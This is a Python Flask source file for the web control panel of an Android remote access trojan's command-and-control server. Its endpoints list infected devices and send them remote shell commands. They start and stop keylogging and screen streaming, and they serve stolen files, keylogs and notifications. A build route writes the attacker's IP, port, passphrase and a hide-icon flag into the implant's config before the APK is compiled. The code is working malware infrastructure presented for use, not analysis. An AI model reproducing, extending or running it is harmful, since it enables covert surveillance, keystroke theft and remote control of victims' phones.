import os
import json
from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_socketio import SocketIO, emit

from server.database import Database
from server.protocol import Protocol
from server.logger import log

DUMPS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "Dumps")


def create_web_app(c2_server) -> tuple:
    app = Flask(__name__, static_folder="static", template_folder="templates")
    app.config["SECRET_KEY"] = os.urandom(24).hex()

    socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")
    c2_server.set_socketio(socketio)
    db = c2_server.db

    @app.route("/")
    def index():
        return render_template("index.html")

    @app.route("/api/devices")
    def api_devices():
        devices = db.get_all_devices()
        connected = c2_server.get_connected_devices()
        for d in devices:
            d["is_online"] = d["device_id"] in connected
        return jsonify(devices)

    @app.route("/api/stats")
    def api_stats():
        stats = db.get_stats()
        stats["online_devices"] = len(c2_server.get_connected_devices())
        return jsonify(stats)

    @app.route("/api/device/<device_id>")
    def api_device(device_id):
        device = db.get_device(device_id)
        history = db.get_command_history(device_id, limit=100)
        files = db.get_files(device_id)
        return jsonify({
            "device": device,
            "history": history,
            "files": files,
            "is_online": device_id in c2_server.get_connected_devices()
        })

    @app.route("/api/command", methods=["POST"])
    def api_command():
        data = request.json
        device_id = data.get("device_id")
        cmd = data.get("cmd")
        args = data.get("args", {})
        if not device_id or not cmd:
            return jsonify({"error": "Missing device_id or cmd"}), 400
        success = c2_server.send_command(device_id, cmd, args)
        return jsonify({"success": success})

    @app.route("/api/files/<device_id>")
    def api_files(device_id):
        return jsonify(db.get_files(device_id))

    @app.route("/api/file/download/<device_id>/<filename>")
    def api_download_file(device_id, filename):
        device_dir = os.path.join(DUMPS_DIR, device_id[:12])
        safe_name = os.path.basename(filename)
        if os.path.isdir(device_dir):
            return send_from_directory(device_dir, safe_name, as_attachment=True)
        return jsonify({"error": "File not found"}), 404

    @app.route("/api/history/<device_id>")
    def api_history(device_id):
        return jsonify(db.get_command_history(device_id, limit=200))

    @app.route("/api/server/info")
    def api_server_info():
        from server.crypto import CryptoManager
        return jsonify({
            "host": c2_server.host,
            "port": c2_server.port,
            "passphrase": c2_server.crypto.passphrase,
            "key_hash": CryptoManager.get_key_hash(c2_server.crypto.passphrase),
        })

    @app.route("/api/build", methods=["POST"])
    def api_build():
        data = request.json
        ip = data.get("ip", "")
        port = data.get("port", "8000")
        passphrase = data.get("passphrase", c2_server.crypto.passphrase)
        hide_icon = data.get("hide_icon", True)
        if not ip or not port:
            return jsonify({"error": "IP and Port are required"}), 400
        config_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "..", "..",
            "Android_Code", "app", "src", "main", "java", "com",
            "egnakerat", "system", "config.java")
        if not os.path.exists(config_path):
            return jsonify({"error": "config.java not found"}), 500
        try:
            with open(config_path, "w") as f:
                f.write(f'''package com.egnakerat.system;

public class config {{
    public static String IP = "{ip}";
    public static String port = "{port}";
    public static boolean icon = {str(hide_icon).lower()};
    public static String PASSPHRASE = "{passphrase}";
    public static final long HEARTBEAT_INTERVAL = 30000;
    public static final long RECONNECT_DELAY = 5000;
    public static final long MAX_RECONNECT_DELAY = 60000;
    public static final long MAX_FILE_SIZE = 50 * 1024 * 1024;
}}
''')
            log.success(f"APK config updated: IP={ip}, PORT={port}")
            return jsonify({"success": True, "message": f"Config updated → IP={ip} PORT={port}. Build with Android Studio."})
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    @app.route("/api/delete/device/<device_id>", methods=["DELETE"])
    def api_delete_device(device_id):
        try:
            conn = db._get_conn()
            conn.execute("DELETE FROM command_history WHERE device_id=?", (device_id,))
            conn.execute("DELETE FROM files WHERE device_id=?", (device_id,))
            conn.execute("DELETE FROM sessions WHERE device_id=?", (device_id,))
            conn.execute("DELETE FROM keylogs WHERE device_id=?", (device_id,))
            conn.execute("DELETE FROM notifications WHERE device_id=?", (device_id,))
            conn.execute("DELETE FROM devices WHERE device_id=?", (device_id,))
            conn.commit()
            return jsonify({"success": True})
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    @socketio.on("connect")
    def on_connect():
        log.info("Web client connected")

    @socketio.on("send_command")
    def on_send_command(data):
        device_id = data.get("device_id")
        cmd = data.get("cmd")
        args = data.get("args", {})
        if device_id and cmd:
            success = c2_server.send_command(device_id, cmd, args)
            emit("command_sent", {"success": success, "cmd": cmd})

    @socketio.on("shell_input")
    def on_shell_input(data):
        device_id = data.get("device_id")
        input_text = data.get("input", "")
        if device_id and input_text:
            c2_server.send_command(device_id, Protocol.CMD_SHELL_CMD, {"input": input_text})

    @socketio.on("start_shell")
    def on_start_shell(data):
        device_id = data.get("device_id")
        if device_id:
            c2_server.send_command(device_id, Protocol.CMD_SHELL)

    @socketio.on("stop_shell")
    def on_stop_shell(data):
        device_id = data.get("device_id")
        if device_id:
            c2_server.send_command(device_id, Protocol.CMD_SHELL_EXIT)

    @socketio.on("start_keylogger")
    def on_start_keylogger(data):
        device_id = data.get("device_id")
        if device_id:
            c2_server.send_command(device_id, Protocol.CMD_START_KEYLOGGER)

    @socketio.on("stop_keylogger")
    def on_stop_keylogger(data):
        device_id = data.get("device_id")
        if device_id:
            c2_server.send_command(device_id, Protocol.CMD_STOP_KEYLOGGER)

    @socketio.on("start_screen_stream")
    def on_start_screen_stream(data):
        device_id = data.get("device_id")
        fps = data.get("fps", 5)
        if device_id:
            c2_server.send_command(device_id, Protocol.CMD_START_SCREEN_STREAM, {"fps": fps})

    @socketio.on("stop_screen_stream")
    def on_stop_screen_stream(data):
        device_id = data.get("device_id")
        if device_id:
            c2_server.send_command(device_id, Protocol.CMD_STOP_SCREEN_STREAM)

    @app.route("/api/keylogs/<device_id>")
    def api_keylogs(device_id):
        return jsonify(db.get_keylogs(device_id, limit=500))

    @app.route("/api/notifications/<device_id>")
    def api_notifications(device_id):
        return jsonify(db.get_notifications(device_id, limit=500))

    return app, socketio
